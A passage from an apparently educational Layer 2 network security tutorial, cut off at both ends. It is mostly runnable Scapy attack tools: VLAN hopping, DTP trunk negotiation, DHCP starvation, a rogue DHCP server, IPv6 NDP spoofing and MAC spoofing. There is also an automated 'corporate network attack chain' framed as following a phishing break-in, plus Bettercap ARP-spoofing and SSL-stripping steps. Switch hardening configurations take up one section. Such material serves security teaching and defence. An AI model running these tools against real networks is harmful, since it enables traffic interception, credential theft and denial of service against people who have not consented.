│                            │                    │
│                            └─> 12 bits = VLAN ID│
│                                (1-4094)          │
└─────────────────────────────────────────────────┘

Double Tagging Attack:
┌────────────────────────────────────────────────────────┐
│ [DA][SA][Tag1: VLAN 1][Tag2: VLAN 20][Data][FCS]     │
│         │ Native VLAN  │ Target VLAN                   │
└────────────────────────────────────────────────────────┘
        ↓
    Switch 1 (strips Tag1)
        ↓
┌────────────────────────────────────────────────────────┐
│ [DA][SA][Tag2: VLAN 20][Data][FCS]                    │
└────────────────────────────────────────────────────────┘
        ↓
    Switch 2 (processes Tag2)
        ↓
   Delivered to VLAN 20!
```

### 5.5 VLAN Hopping Attack Implementation

```python
#!/usr/bin/env python3
"""
VLAN Hopping Attack
Double tagging to send packets to other VLANs
"""

from scapy.all import *

def double_tagging_attack(target_ip, native_vlan=1, target_vlan=20):
    """
    Double tagging VLAN hopping attack
    
    Args:
        target_ip: IP address in target VLAN
        native_vlan: Native VLAN of the port
        target_vlan: Target VLAN to hop to
    """
    print(f"""
╔══════════════════════════════════════════════════════════╗
║        VLAN HOPPING - DOUBLE TAGGING ATTACK              ║
╚══════════════════════════════════════════════════════════╝

Native VLAN:  {native_vlan}
Target VLAN:  {target_vlan}
Target IP:    {target_ip}

[*] Creating double-tagged packet...
    """)
    
    # Create packet with two VLAN tags
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / \
            Dot1Q(vlan=native_vlan) / \
            Dot1Q(vlan=target_vlan) / \
            IP(dst=target_ip) / \
            ICMP() / \
            "VLAN Hopping Test Packet"
    
    # Show packet structure
    print("[*] Packet structure:")
    packet.show()
    
    # Send packet
    print(f"\n[*] Sending double-tagged packet...")
    sendp(packet, verbose=True)
    
    print(f"\n[+] Packet sent")
    print(f"[*] Note: This is one-way communication only")

def dtp_attack(interface="eth0"):
    """
    DTP (Dynamic Trunking Protocol) attack
    Negotiate trunk with switch
    """
    print(f"""
╔══════════════════════════════════════════════════════════╗
║        DTP TRUNK NEGOTIATION ATTACK                      ║
╚══════════════════════════════════════════════════════════╝

[*] Attempting to negotiate trunk with switch...
[*] Interface: {interface}
    """)
    
    # DTP packet to negotiate trunk
    # DTP uses multicast MAC 01:00:0c:cc:cc:cc
    dtp_packet = Ether(dst="01:00:0c:cc:cc:cc") / \
                LLC() / \
                SNAP() / \
                Raw(load=b'\x01\x00\x0c\x00\x00')  # DTP payload
    
    print("[*] Sending DTP packets...")
    sendp(dtp_packet, iface=interface, count=10, inter=1, verbose=True)
    
    print(f"\n[*] DTP negotiation attempted")
    print(f"[*] Check if trunk was established:")
    print(f"    - Monitor for 802.1Q tagged traffic")
    print(f"    - Use Wireshark to verify")

def vlan_enumeration(interface="eth0"):
    """
    Enumerate VLANs by sending packets with different VLAN tags
    """
    print(f"""
╔══════════════════════════════════════════════════════════╗
║        VLAN ENUMERATION                                  ║
╚══════════════════════════════════════════════════════════╝

[*] Probing VLANs 1-50...
    """)
    
    active_vlans = []
    
    for vlan_id in range(1, 51):
        # Send ARP request in each VLAN
        packet = Ether(dst="ff:ff:ff:ff:ff:ff") / \
                Dot1Q(vlan=vlan_id) / \
                ARP(pdst="192.168.1.1")  # Common gateway
        
        # Send and wait for response
        response = srp1(packet, iface=interface, timeout=0.5, verbose=False)
        
        if response:
            active_vlans.append(vlan_id)
            print(f"[+] VLAN {vlan_id} is active (received response)")
        else:
            print(f"[-] VLAN {vlan_id} - no response", end='\r')
    
    print(f"\n\n[+] Enumeration complete")
    print(f"[*] Active VLANs found: {active_vlans}")

# Example usage
if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════════════╗
║        VLAN ATTACK TOOLKIT                               ║
╚══════════════════════════════════════════════════════════╝

1. Double tagging attack
2. DTP trunk negotiation
3. VLAN enumeration
4. Exit
    """)
    
    choice = input("[?] Select option (1-4): ")
    
    if choice == "1":
        target = input("[?] Target IP: ")
        native = int(input("[?] Native VLAN (default: 1): ") or "1")
        target_vlan = int(input("[?] Target VLAN: "))
        double_tagging_attack(target, native, target_vlan)
    
    elif choice == "2":
        interface = input("[?] Interface (default: eth0): ") or "eth0"
        dtp_attack(interface)
    
    elif choice == "3":
        interface = input("[?] Interface (default: eth0): ") or "eth0"
        vlan_enumeration(interface)
```

---

## 6. Other L2 Attacks (STP & DHCP)

### 6.1 DHCP Starvation

- Attacker sends thousands of `DHCP DISCOVER` packets with random MACs.
- The DHCP Server leases all available IPs.
- Real users cannot get an IP (DoS).

### 6.2 Rogue DHCP Server

- Attacker sets up a DHCP Server.
- Races the real server to answer `DHCP DISCOVER` requests.
- **Malicious Payload**: Attacker sets the "Gateway" and "DNS Server" to their own IP.
- **Result**: Man-in-the-Middle.

### 6.3 STP Manipulation

- Spanning Tree Protocol (STP) prevents loops.
- Attacker sends "Superior BPDU" frames claiming to be the Root Bridge.
- Traffic re-routes through the attacker's machine.

### 6.4 DHCP Attack Implementation

```python
#!/usr/bin/env python3
"""
DHCP Attacks: Starvation and Rogue Server
"""

from scapy.all import *
import random

def random_mac():
    """Generate random MAC address"""
    mac = [random.randint(0x00, 0xff) for _ in range(6)]
    return ':'.join(map(lambda x: "%02x" % x, mac))

def dhcp_starvation(interface="eth0", count=100):
    """
    DHCP starvation attack
    Exhausts DHCP pool by requesting with random MACs
    """
    print(f"""
╔══════════════════════════════════════════════════════════╗
║        DHCP STARVATION ATTACK                            ║
╚══════════════════════════════════════════════════════════╝

Interface: {interface}
Requests:  {count}

[*] Starting attack...
    """)
    
    for i in range(count):
        # Random MAC for each request
        src_mac = random_mac()
        
        # Create DHCP DISCOVER packet
        dhcp_discover = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff") / \
                       IP(src="0.0.0.0", dst="255.255.255.255") / \
                       UDP(sport=68, dport=67) / \
                       BOOTP(chaddr=src_mac) / \
                       DHCP(options=[("message-type", "discover"), "end"])
        
        # Send packet
        sendp(dhcp_discover, iface=interface, verbose=False)
        
        if (i+1) % 10 == 0:
            print(f"[*] Sent {i+1}/{count} DHCP DISCOVER packets")
    
    print(f"\n[+] Attack complete")
    print(f"[*] Sent {count} DHCP requests with unique MACs")
    print(f"[*] DHCP server pool may be exhausted")

def rogue_dhcp_server(interface="eth0", gateway_ip="192.168.1.1", 
                     dns_server="8.8.8.8", subnet="192.168.1.0/24"):
    """
    Rogue DHCP server
    Responds to DHCP requests with malicious configuration
    """
    print(f"""
╔══════════════════════════════════════════════════════════╗
║        ROGUE DHCP SERVER                                 ║
╚══════════════════════════════════════════════════════════╝

Interface:    {interface}
Gateway:      {gateway_ip} (attacker)
DNS Server:   {dns_server}
Subnet:       {subnet}

[*] Starting rogue DHCP server...
[*] Press Ctrl+C to stop
    """)
    
    # Get our MAC
    our_mac = get_if_hwaddr(interface)
    
    # IP pool to assign
    import ipaddress
    network = ipaddress.IPv4Network(subnet)
    ip_pool = list(network.hosts())
    assigned_ips = {}
    
    def dhcp_handler(packet):
        """Handle DHCP requests"""
        if DHCP in packet:
            dhcp_type = [opt[1] for opt in packet[DHCP].options if opt[0] == 'message-type'][0]
            client_mac = packet[Ether].src
            
            if dhcp_type == 1:  # DHCP DISCOVER
                print(f"\n[*] DHCP DISCOVER from {client_mac}")
                
                # Assign IP
                if client_mac not in assigned_ips:
                    if ip_pool:
                        assigned_ips[client_mac] = str(ip_pool.pop(0))
                
                offered_ip = assigned_ips.get(client_mac)
                
                if offered_ip:
                    # Create DHCP OFFER
                    dhcp_offer = Ether(src=our_mac, dst=client_mac) / \
                                IP(src=gateway_ip, dst="255.255.255.255") / \
                                UDP(sport=67, dport=68) / \
                                BOOTP(op=2, yiaddr=offered_ip, siaddr=gateway_ip, 
                                     chaddr=packet[BOOTP].chaddr, xid=packet[BOOTP].xid) / \
                                DHCP(options=[("message-type", "offer"),
                                            ("server_id", gateway_ip),
                                            ("lease_time", 3600),
                                            ("subnet_mask", "255.255.255.0"),
                                            ("router", gateway_ip),  # Attacker as gateway!
                                            ("name_server", dns_server),
                                            "end"])
                    
                    # Send OFFER
                    sendp(dhcp_offer, iface=interface, verbose=False)
                    print(f"[+] Sent DHCP OFFER: {offered_ip} to {client_mac}")
            
            elif dhcp_type == 3:  # DHCP REQUEST
                print(f"\n[*] DHCP REQUEST from {client_mac}")
                
                offered_ip = assigned_ips.get(client_mac)
                
                if offered_ip:
                    # Create DHCP ACK
                    dhcp_ack = Ether(src=our_mac, dst=client_mac) / \
                              IP(src=gateway_ip, dst="255.255.255.255") / \
                              UDP(sport=67, dport=68) / \
                              BOOTP(op=2, yiaddr=offered_ip, siaddr=gateway_ip,
                                   chaddr=packet[BOOTP].chaddr, xid=packet[BOOTP].xid) / \
                              DHCP(options=[("message-type", "ack"),
                                          ("server_id", gateway_ip),
                                          ("lease_time", 3600),
                                          ("subnet_mask", "255.255.255.0"),
                                          ("router", gateway_ip),
                                          ("name_server", dns_server),
                                          "end"])
                    
                    # Send ACK
                    sendp(dhcp_ack, iface=interface, verbose=False)
                    print(f"[+] Sent DHCP ACK: {offered_ip} to {client_mac}")
                    print(f"[!] Client will now use {gateway_ip} as gateway!")
    
    # Sniff DHCP traffic
    try:
        sniff(iface=interface, filter="udp and (port 67 or port 68)", 
              prn=dhcp_handler, store=False)
    except KeyboardInterrupt:
        print(f"\n[*] Rogue DHCP server stopped")
        print(f"[*] Served {len(assigned_ips)} clients")

# Example usage
if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[-] This script requires root privileges")
        sys.exit(1)
    
    print("""
1. DHCP starvation attack
2. Rogue DHCP server
3. Exit
    """)
    
    choice = input("[?] Select option (1-3): ")
    
    if choice == "1":
        interface = input("[?] Interface (default: eth0): ") or "eth0"
        count = int(input("[?] Number of requests (default: 100): ") or "100")
        dhcp_starvation(interface, count)
    
    elif choice == "2":
        interface = input("[?] Interface (default: eth0): ") or "eth0"
        gateway = input("[?] Gateway IP (attacker IP): ")
        dns = input("[?] DNS server (default: 8.8.8.8): ") or "8.8.8.8"
        subnet = input("[?] Subnet (default: 192.168.1.0/24): ") or "192.168.1.0/24"
        rogue_dhcp_server(interface, gateway, dns, subnet)
```

---

## 7. Defense: Hardening the Switch

Layer 2 security MUST be done at the switch. You cannot fix ARP on the endpoint effectively.

### 7.1 Port Security

**Purpose**: Limit MAC addresses allowed on a port and prevent MAC flooding.

**Configuration (Cisco IOS)**:
```cisco
! Enter interface configuration
interface GigabitEthernet0/1

! Enable port security
switchport port-security

! Maximum number of MAC addresses (default 1)
switchport port-security maximum 2

! Define violation action
switchport port-security violation shutdown
! Options: shutdown, restrict (drop packets), protect (drop silently)

! Specify allowed MAC addresses (optional)
switchport port-security mac-address aaaa.bbbb.cccc
! Or learn dynamically:
switchport port-security mac-address sticky

! View configuration
show port-security interface GigabitEthernet0/1
```

**For Beginners - Port Security Explained**:

Imagine your office door with a lock:
- **Without Port Security**: Anyone can walk in (any MAC address)
- **With Port Security**: Only 1-2 specific people allowed (specific MAC addresses)
- **Violation Action**: If stranger tries to enter, alarm goes off and door locks (port shuts down)

### 7.2 DHCP Snooping

**Purpose**: Prevent rogue DHCP servers and track IP-MAC bindings.

**How it Works**:
1. Mark switch ports as **Trusted** (legitimate DHCP servers) or **Untrusted** (clients)
2. Block DHCP OFFER/ACK packets from untrusted ports
3. Build a binding table of IP-MAC-Port-VLAN

**Configuration**:
```cisco
! Enable DHCP snooping globally
ip dhcp snooping

! Enable for specific VLANs
ip dhcp snooping vlan 10,20

! Mark trusted port (server/uplink)
interface GigabitEthernet0/24
  ip dhcp snooping trust

! All other ports are untrusted by default

! Limit DHCP packet rate (prevent starvation)
interface range GigabitEthernet0/1-23
  ip dhcp snooping limit rate 10

! View binding table
show ip dhcp snooping binding
```

**DHCP Snooping Binding Table Example**:
```
MacAddress         IpAddress    Lease(sec)  Type    VLAN  Interface
------------------  -----------  ----------  -----   ----  ---------
AA:BB:CC:DD:EE:01  192.168.1.10    86400     dhcp     10   Gi0/1
AA:BB:CC:DD:EE:02  192.168.1.11    86400     dhcp     10   Gi0/2
```

### 7.3 Dynamic ARP Inspection (DAI)

**Purpose**: Prevent ARP spoofing by validating ARP packets.

**How it Works**:
- Uses DHCP snooping binding table as reference
- Inspects all ARP packets on untrusted ports
- Drops packets with mismatched IP-MAC bindings

**Configuration**:
```cisco
! Enable DAI for VLAN
ip arp inspection vlan 10,20

! Mark trusted ports (don't inspect)
interface GigabitEthernet0/24
  ip arp inspection trust

! Validate source MAC, destination MAC, and IP
ip arp inspection validate src-mac dst-mac ip

! Rate limiting (prevent ARP packet floods)
interface range GigabitEthernet0/1-23
  ip arp inspection limit rate 15

! View statistics
show ip arp inspection statistics
```

**For Beginners - DAI Explained**:

Think of DAI as a security guard checking IDs:

**Without DAI**:
- Attacker: "I'm the router! (fake ID)"
- Computer: "OK, I'll send traffic to you"

**With DAI**:
- Attacker: "I'm the router! (fake ID)"
- DAI Guard: "Let me check the database... Your ID doesn't match! REJECTED!"
- Attacker's packet is dropped

### 7.4 Disable DTP (Dynamic Trunking Protocol)

**Purpose**: Prevent VLAN hopping via switch spoofing.

**Configuration**:
```cisco
! For access ports (user ports)
interface range GigabitEthernet0/1-20
  switchport mode access
  switchport access vlan 10
  switchport nonegotiate  ! Disable DTP

! For trunk ports (switch-to-switch)
interface GigabitEthernet0/24
  switchport mode trunk
  switchport trunk native vlan 999  ! Use uncommon VLAN
  switchport trunk allowed vlan 10,20,30  ! Explicit list
  switchport nonegotiate  ! Disable DTP
```

### 7.5 Additional Layer 2 Security Best Practices

```cisco
! 1. Disable unused ports
interface range GigabitEthernet0/10-20
  shutdown

! 2. Put unused ports in unused VLAN
interface range GigabitEthernet0/10-20
  switchport access vlan 999
  shutdown

! 3. Enable BPDU Guard (prevent STP attacks)
interface range GigabitEthernet0/1-20
  spanning-tree bpduguard enable

! 4. Enable Root Guard (prevent STP root takeover)
interface GigabitEthernet0/24
  spanning-tree guard root

! 5. Storm Control (prevent broadcast storms)
interface range GigabitEthernet0/1-20
  storm-control broadcast level 50.00
  storm-control action shutdown

! 6. IP Source Guard (works with DHCP snooping)
interface range GigabitEthernet0/1-20
  ip verify source
```

### 7.6 Complete Switch Hardening Script

```python
#!/usr/bin/env python3
"""
Switch Hardening Configuration Generator
Creates secure Cisco switch configuration
"""

def generate_switch_config(num_access_ports=24, num_trunk_ports=2, 
                          access_vlans=[10, 20], trunk_vlans=[10, 20, 30]):
    """
    Generate hardened switch configuration
    """
    
    config = """!
! ============================================
! LAYER 2 SECURITY HARDENED CONFIGURATION
! ============================================
!
hostname SecureSwitch
!
! Enable password encryption
service password-encryption
!
! === GLOBAL SECURITY SETTINGS ===
!
! Enable DHCP Snooping
ip dhcp snooping
ip dhcp snooping vlan {access_vlans}
!
! Enable DAI
ip arp inspection vlan {access_vlans}
ip arp inspection validate src-mac dst-mac ip
!
! === VLAN CONFIGURATION ===
!
""".format(access_vlans=','.join(map(str, access_vlans)))
    
    # Create VLANs
    for vlan in access_vlans + trunk_vlans:
        config += f"vlan {vlan}\n"
        config += f"  name VLAN{vlan}\n!\n"
    
    # Unused VLAN
    config += "vlan 999\n  name UNUSED\n!\n"
    
    # Access port configuration
    config += f"""
! === ACCESS PORT CONFIGURATION ===
!
! Template for access ports
interface range GigabitEthernet0/1-{num_access_ports}
  ! Set as access port
  switchport mode access
  switchport access vlan {access_vlans[0]}
  
  ! Disable DTP
  switchport nonegotiate
  
  ! Port Security
  switchport port-security
  switchport port-security maximum 2
  switchport port-security violation shutdown
  switchport port-security mac-address sticky
  
  ! DHCP Snooping rate limiting
  ip dhcp snooping limit rate 10
  
  ! ARP Inspection rate limiting  
  ip arp inspection limit rate 15
  
  ! IP Source Guard
  ip verify source
  
  ! BPDU Guard
  spanning-tree bpduguard enable
  spanning-tree portfast
  
  ! Storm Control
  storm-control broadcast level 50.00
  storm-control action shutdown
!
"""
    
    # Trunk port configuration
    for i in range(1, num_trunk_ports + 1):
        port_num = num_access_ports + i
        config += f"""
! Trunk Port {i}
interface GigabitEthernet0/{port_num}
  ! Set as trunk
  switchport mode trunk
  switchport trunk native vlan 999
  switchport trunk allowed vlan {','.join(map(str, trunk_vlans))}
  
  ! Disable DTP
  switchport nonegotiate
  
  ! Trust for DHCP Snooping
  ip dhcp snooping trust
  
  ! Trust for DAI
  ip arp inspection trust
  
  ! Root Guard
  spanning-tree guard root
!
"""
    
    # Disabled ports
    config += """
! === UNUSED PORTS ===
!
! Shutdown and move to unused VLAN
interface range GigabitEthernet0/{start}-{end}
  switchport access vlan 999
  shutdown
!
""".format(start=num_access_ports + num_trunk_ports + 1, end=48)
    
    # Management
    config += """
! === MANAGEMENT ===
!
! Management VLAN
interface Vlan1
  no ip address
  shutdown
!
interface Vlan100
  ip address 192.168.100.1 255.255.255.0
  description Management
!
! Enable SSH
ip domain-name secure.local
crypto key generate rsa modulus 2048
!
line vty 0 4
  transport input ssh
  login local
!
username admin privilege 15 secret SecurePassword123!
!
! Enable logging
logging buffered 51200
logging console
!
! Save configuration
end
write memory
"""
    
    return config

# Generate and display
if __name__ == "__main__":
    print("="*60)
    print("SECURE SWITCH CONFIGURATION GENERATOR")
    print("="*60)
    
    config = generate_switch_config(
        num_access_ports=20,
        num_trunk_ports=2,
        access_vlans=[10, 20],
        trunk_vlans=[10, 20, 30]
    )
    
    print(config)
    
    # Save to file
    with open("secure_switch_config.txt", "w") as f:
        f.write(config)
    
    print("\n[+] Configuration saved to: secure_switch_config.txt")
    print("[*] Review and customize before applying to production!")
```

---

## 8. Practical Lab: The Man-in-the-Middle

> [!WARNING]
> Perform this ONLY in your virtual lab.

### 8.1 Lab Setup

**Objective**: Intercept DNS queries and HTTP traffic from a victim VM.

**Network Topology**:
```
┌─────────────────────────────────────────────────┐
│                Virtual Network                  │
│               (192.168.1.0/24)                  │
├─────────────────────────────────────────────────┤
│                                                 │
│  ┌──────────────┐      ┌──────────────┐        │
│  │   Victim VM  │      │  Attacker VM │        │
│  │  Windows 10  │      │  Kali Linux  │        │
│  │192.168.1.10  │      │192.168.1.50  │        │
│  └──────────────┘      └──────────────┘        │
│         │                      │                │
│         └──────────┬───────────┘                │
│                    │                            │
│              ┌─────┴──────┐                     │
│              │   Router   │                     │
│              │192.168.1.1 │                     │
│              └────────────┘                     │
└─────────────────────────────────────────────────┘
```

**Setup Requirements**:
- Attacker: Kali Linux
- Victim: Windows 10 or Ubuntu
- Both VMs on same network (bridged or NAT)

### 8.2 Step-by-Step Attack

**Step 1: Enable IP Forwarding**
```bash
# On Kali (Attacker)
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Verify
cat /proc/sys/net/ipv4/ip_forward
# Should output: 1
```

**Step 2: Discover Targets**
```bash
# Scan the network
sudo nmap -sn 192.168.1.0/24

# Or use arp-scan
sudo arp-scan -l

# Or use netdiscover
sudo netdiscover -r 192.168.1.0/24
```

**Step 3: Start Bettercap**
```bash
sudo bettercap -iface eth0
```

**Step 4: Inside Bettercap - Discovery**
```bettercap
# Enable network discovery
net.probe on

# Wait a few seconds, then show hosts
net.show

# You should see:
# 192.168.1.1   (gateway)
# 192.168.1.10  (victim)
# 192.168.1.50  (you)
```

**Step 5: Configure ARP Spoofing**
```bettercap
# Set target victim
set arp.spoof.targets 192.168.1.10

# Enable full duplex (spoof both victim and gateway)
set arp.spoof.fullduplex true

# Start ARP spoofing
arp.spoof on

# Verify spoofing is active
arp.spoof.stats
```

**Step 6: Enable Packet Sniffing**
```bettercap
# Start sniffing
net.sniff on

# Enable verbose mode to see details
set net.sniff.verbose true

# Filter for specific protocols
set net.sniff.filter 'port 80 or port 21 or port 23'

# Optional: Save to pcap file
set net.sniff.output capture.pcap
```

**Step 7: Generate Traffic on Victim**

On the victim machine:
```
1. Open web browser
2. Visit http://example.com (not HTTPS!)
3. Visit http://testphp.vulnweb.com
4. Try FTP: ftp ftp.example.com
```

**Step 8: Observe Intercepted Traffic**

You should see in Bettercap console:
```
[net.sniff] 192.168.1.10 > example.com:80 GET / HTTP/1.1
[net.sniff] 192.168.1.10 > 8.8.8.8:53 DNS query: example.com
```

**Step 9: Stop Attack**
```bettercap
# Stop ARP spoofing
arp.spoof off

# Stop sniffing
net.sniff off

# Exit
exit
```

**Step 10: Cleanup**
```bash
# Disable IP forwarding
echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
```

### 8.3 Advanced Lab: SSL Stripping

**Concept**: Downgrade HTTPS to HTTP to intercept encrypted traffic.

```bettercap
# Enable HTTP/HTTPS proxy
set http.proxy.sslstrip true
set http.proxy.script /usr/share/bettercap/caplets/beef-inject.js
http.proxy on

# Enable SSL stripping
set https.proxy.sslstrip true
https.proxy on

# Start ARP spoofing
set arp.spoof.targets 192.168.1.10
arp.spoof on
```

**What Happens**:
1. Victim requests: https://example.com
2. Attacker intercepts and requests: https://example.com
3. Attacker serves victim: http://example.com (downgraded!)
4. Victim sees HTTP, attacker sees decrypted traffic

### 8.4 Lab Exercise Worksheet

**For Beginners - Follow These Steps**:

```
=== PRE-ATTACK CHECKLIST ===
□ Both VMs on same network
□ Victim can ping gateway
□ Victim can browse internet
□ Attacker has Kali Linux
□ Bettercap installed

=== ATTACK CHECKLIST ===
□ IP forwarding enabled
□ Network scanned, targets identified
□ Bettercap started
□ net.probe discovered hosts
□ arp.spoof.targets set correctly
□ ARP spoofing started
□ Packet sniffing enabled
□ Traffic generated on victim
□ Traffic intercepted and visible

=== POST-ATTACK CHECKLIST ===
□ ARP spoofing stopped
□ IP forwarding disabled
□ Victim's internet still works
□ Logs/pcap saved for analysis

=== TROUBLESHOOTING ===
Problem: Victim loses internet
Solution: Check IP forwarding is enabled

Problem: No traffic captured
Solution: Check filter settings, try without filter

Problem: ARP spoofing not working
Solution: Verify targets are on same subnet
```

---

## 9. Advanced Attack Scenarios

### 9.1 Scenario: Corporate Network Penetration

**Situation**: You've gained access to a corporate network via phishing. You're on a user VLAN.

**Objective**: Access server VLAN without detection.

**Attack Chain**:

```
Step 1: Reconnaissance
  → arp-scan to map network
  → Identify gateway, DNS server
  → Check for VLANs (802.1Q traffic)

Step 2: ARP Poisoning
  → Target specific high-value user
  → Intercept credentials

Step 3: VLAN Hopping
  → Attempt DTP negotiation
  → Or double-tagging to server VLAN

Step 4: Lateral Movement
  → Use captured credentials
  → Access server VLAN resources

Step 5: Persistence
  → Maintain ARP poisoning
  → Exfiltrate data slowly
```

**Implementation**:

```python
#!/usr/bin/env python3
"""
Corporate Network Attack Chain
Automated L2 attack sequence
"""

from scapy.all import *
import time

class CorporateNetworkAttack:
    def __init__(self, interface="eth0"):
        self.interface = interface
        self.targets = []
        self.gateway = None
        
    def step1_reconnaissance(self):
        """
        Network reconnaissance
        """
        print("[*] Step 1: Reconnaissance")
        print("="*60)
        
        # ARP scan
        print("[*] Scanning network...")
        answered, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"),
                         timeout=3, verbose=False)
        
        print(f"[+] Found {len(answered)} hosts:\n")
        
        for sent, received in answered:
            ip = received[ARP].psrc
            mac = received[ARP].hwsrc
            
            # Identify gateway (usually .1 or .254)
            if ip.endswith('.1') or ip.endswith('.254'):
                self.gateway = {'ip': ip, 'mac': mac}
                print(f"[!] Potential Gateway: {ip} ({mac})")
            else:
                self.targets.append({'ip': ip, 'mac': mac})
                print(f"    Host: {ip} ({mac})")
        
        # Check for VLAN tags
        print("\n[*] Checking for VLAN tagged traffic...")
        packets = sniff(iface=self.interface, count=100, timeout=5, verbose=False)
        
        vlans = set()
        for pkt in packets:
            if Dot1Q in pkt:
                vlans.add(pkt[Dot1Q].vlan)
        
        if vlans:
            print(f"[+] Detected VLANs: {sorted(vlans)}")
        else:
            print("[-] No VLAN tags detected")
        
        time.sleep(2)
    
    def step2_arp_poisoning(self, target_ip):
        """
        Targeted ARP poisoning
        """
        print(f"\n[*] Step 2: ARP Poisoning")
        print("="*60)
        print(f"[*] Target: {target_ip}")
        print(f"[*] Gateway: {self.gateway['ip']}")
        
        # Enable IP forwarding
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        
        # Get target MAC
        target_mac = None
        for host in self.targets:
            if host['ip'] == target_ip:
                target_mac = host['mac']
                break
        
        if not target_mac:
            print("[-] Target not found")
            return
        
        print(f"[+] Starting ARP poisoning for 30 seconds...")
        
        end_time = time.time() + 30
        while time.time() < end_time:
            # Poison target
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                    psrc=self.gateway['ip']), verbose=False)
            
            # Poison gateway
            send(ARP(op=2, pdst=self.gateway['ip'], hwdst=self.gateway['mac'],
                    psrc=target_ip), verbose=False)
            
            time.sleep(2)
        
        print("[+] ARP poisoning complete")
    
    def step3_vlan_hopping(self, target_vlan=20):
        """
        Attempt VLAN hopping
        """
        print(f"\n[*] Step 3: VLAN Hopping")
        print("="*60)
        
        # Try DTP negotiation
        print("[*] Attempting DTP negotiation...")
        dtp_pkt = Ether(dst="01:00:0c:cc:cc:cc")/LLC()/SNAP()/Raw(load=b'\x01\x00\x0c\x00\x00')
        sendp(dtp_pkt, iface=self.interface, count=5, verbose=False)
        
        # Try double tagging
        print(f"[*] Attempting double tagging to VLAN {target_vlan}...")
        double_tag_pkt = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=target_vlan)/IP(dst="192.168.20.1")/ICMP()
        sendp(double_tag_pkt, iface=self.interface, verbose=False)
        
        print("[*] VLAN hopping attempts complete")
    
    def run_attack(self, target_ip):
        """
        Run complete attack chain
        """
        print("""
╔══════════════════════════════════════════════════════════╗
║        CORPORATE NETWORK ATTACK CHAIN                    ║
╚══════════════════════════════════════════════════════════╝
        """)
        
        self.step1_reconnaissance()
        self.step2_arp_poisoning(target_ip)
        self.step3_vlan_hopping()
        
        print("\n[+] Attack chain complete")

# Example usage
if __name__ == "__main__":
    attack = CorporateNetworkAttack("eth0")
    target = input("[?] Target IP for ARP poisoning: ")
    attack.run_attack(target)
```

### 9.2 Scenario: Evil Twin Access Point + ARP Spoofing

**Concept**: Combine fake WiFi AP with L2 attacks.

```
Attack Flow:
1. Set up rogue WiFi AP (Evil Twin)
2. Victim connects to fake AP
3. Perform ARP spoofing on victim
4. Intercept all traffic
5. Capture credentials
```

### 9.3 Scenario: IPv6 Neighbor Discovery Spoofing

**Note**: IPv6 uses NDP (Neighbor Discovery Protocol) instead of ARP.

```python
#!/usr/bin/env python3
"""
IPv6 NDP Spoofing (similar to ARP spoofing)
"""

from scapy.all import *

def ipv6_ndp_spoof(target_ipv6, gateway_ipv6, interface="eth0"):
    """
    Spoof IPv6 Neighbor Discovery
    """
    print(f"[*] IPv6 NDP Spoofing")
    print(f"    Target: {target_ipv6}")
    print(f"    Gateway: {gateway_ipv6}")
    
    # Get our MAC
    our_mac = get_if_hwaddr(interface)
    
    # Send spoofed Neighbor Advertisement to target
    # Claim we are the gateway
    na_target = Ether()/IPv6(dst=target_ipv6)/ICMPv6ND_NA(
        tgt=gateway_ipv6, R=1, S=1, O=1)/ICMPv6NDOptDstLLAddr(lladdr=our_mac)
    
    # Send spoofed NA to gateway
    # Claim we are the target
    na_gateway = Ether()/IPv6(dst=gateway_ipv6)/ICMPv6ND_NA(
        tgt=target_ipv6, R=1, S=1, O=1)/ICMPv6NDOptDstLLAddr(lladdr=our_mac)
    
    print("[*] Sending spoofed NDP packets...")
    
    for _ in range(10):
        sendp(na_target, iface=interface, verbose=False)
        sendp(na_gateway, iface=interface, verbose=False)
        time.sleep(2)
    
    print("[+] IPv6 NDP spoofing complete")

# Example
if __name__ == "__main__":
    target = input("[?] Target IPv6: ")
    gateway = input("[?] Gateway IPv6: ")
    ipv6_ndp_spoof(target, gateway)
```

---

## 10. MAC Address Manipulation

### 10.1 Changing Your MAC Address

**For Beginners**: Why change MAC address?
- Bypass MAC filtering
- Impersonate another device
- Avoid tracking
- Test security controls

**Linux**:
```bash
# Method 1: ifconfig
sudo ifconfig eth0 down
sudo ifconfig eth0 hw ether 00:11:22:33:44:55
sudo ifconfig eth0 up

# Method 2: macchanger
sudo macchanger -r eth0  # Random MAC
sudo macchanger -a eth0  # Random vendor MAC
sudo macchanger -s eth0  # Show current MAC
sudo macchanger -m 00:11:22:33:44:55 eth0  # Specific MAC
```

**Windows**:
```powershell
# View current MAC
Get-NetAdapter | Select-Object Name, MacAddress

# Change MAC (Registry method)
$adapter = "Ethernet"
$newMAC = "001122334455"
Set-NetAdapter -Name $adapter -MacAddress $newMAC

# Or use Device Manager:
# 1. Device Manager > Network Adapters
# 2. Right-click adapter > Properties
# 3. Advanced tab > Network Address
# 4. Enter new MAC (no colons/dashes)
```

### 10.2 MAC Address Spoofing Script

```python
#!/usr/bin/env python3
"""
MAC Address Spoofing Tool
"""

import subprocess
import re
import random

class MACSpoofer:
    def __init__(self, interface):
        self.interface = interface
        self.original_mac = self.get_current_mac()
    
    def get_current_mac(self):
        """Get current MAC address"""
        try:
            output = subprocess.check_output(['ifconfig', self.interface]).decode()
            mac_search = re.search(r'(\w\w:\w\w:\w\w:\w\w:\w\w:\w\w)', output)
            if mac_search:
                return mac_search.group(0)
        except:
            return None
    
    def change_mac(self, new_mac):
        """Change MAC address"""
        print(f"[*] Changing MAC of {self.interface}")
        print(f"    Current: {self.original_mac}")
        print(f"    New:     {new_mac}")
        
        # Bring interface down
        subprocess.call(['sudo', 'ifconfig', self.interface, 'down'])
        
        # Change MAC
        subprocess.call(['sudo', 'ifconfig', self.interface, 'hw', 'ether', new_mac])
        
        # Bring interface up
        subprocess.call(['sudo', 'ifconfig', self.interface, 'up'])
        
        # Verify
        current = self.get_current_mac()
        if current == new_mac:
            print(f"[+] MAC successfully changed to {new_mac}")
            return True
        else:
            print(f"[-] Failed to change MAC")
            return False
    
    def random_mac(self):
        """Generate random MAC"""
